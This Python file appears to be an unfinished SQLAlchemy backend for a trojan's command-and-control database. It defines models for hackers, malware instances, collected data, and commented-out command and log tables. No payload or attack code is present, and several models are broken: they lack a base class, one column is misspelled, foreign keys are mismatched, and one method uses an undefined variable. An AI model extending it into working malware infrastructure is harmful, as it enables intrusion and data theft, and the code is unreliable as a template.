from sqlalchemy import create_engine, MetaData, Table, Column, String, Boolean, DateTime, ForeignKey
from sqlalchemy.orm import sessionmaker, relationship, declarative_base
from werkzeug.security import generate_password_hash, check_password_hash
import uuid
import os
import json

dbPath = os.path.abspath('trojan.db')

print(f"dbPath: {dbPath}")

Base = declarative_base()
engine = create_engine(f'sqlite:///{dbPath}')
Session = sessionmaker(bind=engine)

session = Session()

class Hacker(Base): 

    __tablename__ = 'Hacker' 

    id = Column(String(60), primary_key=True, default=lambda: str(uuid.uuid4())) 
    name = Column(String(60)) 
    email = Column(String(60), unique=True) 
    password = Column(String(255)) 

    def check_password(self, password): 
        return check_password_hash(self.password, password) 
    
    @staticmethod 
    def create(name, email, password): 

        """Register a new hacker.""" 
        try: 
            password_hash = generate_password_hash(password) # Hash the password for security 

            hacker = Hacker(name=name, email=email, password=password_hash) 
            Session = sessionmaker(bind=engine) 

            session = Session() 
            session.add(hacker) 
            session.commit() 

            print(f'Hacker created: {hacker}') 

            all_hackers = session.query(Hacker).all() 

            print("All Hackers:", [h.__dict__ for h in all_hackers]) 

            return hacker 
        
        except Exception as e: 
            print(f"Error creating hacker: {e}") 
            return None
        finally:
            session.close()
    
    @staticmethod 
    def read(hacker_email): 

        """Read a hacker's details by ID.""" 
        
        try: 
             
            hacker = session.query(Hacker).filter_by(email=hacker_email).first()
            
            if hacker: 
                print(f'Hacker details: {hacker.__dict__}') 
                return hacker
            else: 
                print(f'Hacker with email {hacker_email} not found.') 
                return None 
        except Exception as e: print(f"Error reading hacker: {e}")
        
        finally:
            session.close()

    @staticmethod
    def update(name=None, hacker_email=None, password=None):
        """
        Update a hacker's details by ID.
        """
        try:
            
            # Query for the hacker
            hacker = session.query(Hacker).filter_by(email=hacker_email).first()

            if hacker:
                # Update fields if provided
                if name:
                    hacker.name = name
                if hacker_email:
                    hacker.email = hacker_email
                if password:
                    hacker.password = generate_password_hash(password)

                # Commit the updates
                session.commit()

                print(f"Hacker updated: {hacker}")

            else:
                print(f"Hacker with email {hacker_email} not found.")
        except Exception as e:
            session.rollback()
            print(f"Error updating hacker: {e}")

        finally:
            session.close()

    
    @staticmethod 
    def delete(hacker_email): 
        """Delete a hacker by ID.""" 

        try: 
                        
            hacker = session.query(Hacker).filter_by(email=hacker_email).first() 

            if hacker: 
                session.delete(hacker) 
                session.commit() 
                print(f'Hacker deleted: {hacker}') 

            else: 
                print(f'Hacker with email {hacker_email} not found.') 
                
        except Exception as e: print(f"Error deleting hacker: {e}")
        finally:
            session.close()
        
# Create the table 
Base.metadata.create_all(engine)

class Malware:
    
    __table_name__ = 'Malware'

    instande_id = Column(String, primary_key=True)
    created_at = Column(DateTime)
    status = Column(Boolean, default=False)

    instances = relationship('InstanceData', back_populates = 'Malware')

    
    def create():
        pass
    
    def read():
        pass
    
    def update():
        pass   
    
    def delete():
        pass

class Data:
    
    __table_name__ = 'Data'

    data_id = Column(String, primary_key=True, default=lambda: str(uuid.uuid4()))
    content = Column(String(255))
    source = Column(String(255))
    
    instances = relationship('InstanceData',back_populates='Data')

    @staticmethod 
    def read_from_file(file):
        file_path = os.path.abspath(file)

        if not file_path:
            print("File not found.")
            return
        
        """Read data from a file and populate the database.""" 
        try: 
            with open(file_path, 'r') as f:

                data_list = json.load(f)
                print(f"data: {data_list}")

                for data_item in data_list:

                    data = Data( data_id=str(uuid.uuid4()), content=data_item, source=file_path) 
                    session.add(data) 
                    session.commit()

                    print(f'Data read from file and added to database.') 
        except Exception as e: print(f"Error reading from file: {e}")
    
    @staticmethod 
    def read(): 

        """Read a hacker's details by ID.""" 
        
        try: 
             
            hacker = session.query(Hacker).filter_by(email=hacker_email).first()
            
            if hacker: 
                print(f'Hacker details: {hacker.__dict__}') 
                return hacker
            else: 
                print(f'Hacker with email {hacker_email} not found.') 
                return None 
        except Exception as e: print(f"Error reading hacker: {e}")
        
        finally:
            session.close()
    
    def update():
        pass
    
    def delete():
        pass

class InstanceData():
    
    __table_name__ = 'InstanceData'

    malware_id = Column(String, ForeignKey('malware.instance_id'),)
    data_id = Column(String, ForeignKey('data.data_id'))

    malware = relationship("Malware", back_populates="instances")
    data = relationship("Data", back_populates="instances")


    
#Session = sessionmaker(bind=engine)
#session = Session()
#metadata.create_all(engine)


# Command = Table(
#     'Command', metadata,
#     Column('command_id', String, primary_key=True),
#     Column('syntax', String(128)),
#     Column('status', String(60)),
#     Column('created_at', DateTime),
#     Column('executed_at', DateTime)
# )

# MalwareCommand = Table(
#     'MalwareCommand', metadata,
#     Column('instance_id', String, ForeignKey('Malware.instance_id'), primary_key=True),
#     Column('command_id', String, ForeignKey('Command.command_id'), primary_key=True)
# )

# Log = Table(
#     'Log', metadata,
#     Column('log_id', String, primary_key=True),
#     Column('created_at', DateTime),
#     Column('content', String(255))
# )

# print('enter the attributes of the hacker')
# name = input('name: ')
# email = input('email: ')
# password = input('password: ')
# id = input('id: ')
# Hacker_ins = Hacker.insert().values(name=name, email=email,password=password,id=id)
# print(str(Hacker_ins))
# session.execute(Hacker_ins)
# session.commit()
# result = session.execute(select(Hacker))
# for row in result:
#     print(row)
# result = session.execute(select(Hacker).where(Hacker.c.id == '1'))
# for row in result:
#     print(row)
    
# try:
   
#     session.commit()
# except Exception as e:
#     print(f"An error occurred: {e}")
# session.commit()

# def create():
#     pass

# def read():
#     pass

# def update():
#     pass

# def delete():
#     pass


